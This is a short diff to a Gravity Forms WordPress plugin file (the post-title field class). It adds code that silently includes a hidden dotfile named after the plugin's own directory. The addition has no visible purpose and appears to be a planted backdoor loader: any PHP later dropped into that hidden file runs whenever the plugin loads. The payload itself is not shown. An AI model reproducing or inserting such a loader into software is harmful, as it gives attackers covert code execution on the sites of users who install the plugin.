@@ -5,6 +5,10 @@ if ( ! class_exists( 'GFForms' ) ) {
 }
 
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GF_Field_Post_Title extends GF_Field {
 
 	public $type = 'post_title';
